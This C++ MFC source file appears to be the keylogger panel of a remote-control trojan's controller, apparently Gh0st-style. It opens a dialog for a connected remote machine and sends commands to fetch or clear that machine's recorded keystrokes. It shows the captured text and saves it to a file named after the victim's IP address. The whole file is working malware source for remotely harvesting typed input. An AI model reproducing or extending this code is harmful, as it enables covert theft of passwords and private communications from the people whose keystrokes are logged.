// CKeyboard.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CKeyboard.h"
#include "afxdialogex.h"
#include"../../common/macros.h"

// CKeyboard 对话框

IMPLEMENT_DYNAMIC(CKeyboard, CDialog)

CKeyboard::CKeyboard(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_KEYBOARD, pParent)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
}

CKeyboard::~CKeyboard()
{

}

void CKeyboard::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
}


BEGIN_MESSAGE_MAP(CKeyboard, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_BUTTON1, &CKeyboard::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON3, &CKeyboard::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CKeyboard::OnBnClickedButton4)
END_MESSAGE_MAP()


// CKeyboard 消息处理程序


BOOL CKeyboard::OnInitDialog()
{
	CDialog::OnInitDialog();

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 键盘记录", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}



void CKeyboard::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_KEYBOARD_DATA:
		AddKeyBoardData();
		break;
	default:
		break;
	}
}

void CKeyboard::AddKeyBoardData()
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	m_edit.SetWindowTextA((TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	/*
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel((TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	*/
}

BOOL CKeyboard::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}


void CKeyboard::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CKeyboard::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

}

//获取记录
void CKeyboard::OnBnClickedButton1()
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_KEYBOARD_GET;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CKeyboard::OnBnClickedButton3()
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_KEYBOARD_CLEAR;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	m_edit.SetWindowText(_T(""));
}


void CKeyboard::OnBnClickedButton4()
{
	// TODO: Add your control notification handler code here
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.txt");
	CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
	if (dlg.DoModal() != IDOK)
		return;

	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return;
	}
	// Write the DIB header and the bits
	CString	strRecord;
	m_edit.GetWindowText(strRecord);
	file.Write(strRecord, strRecord.GetLength());
	file.Close();
}
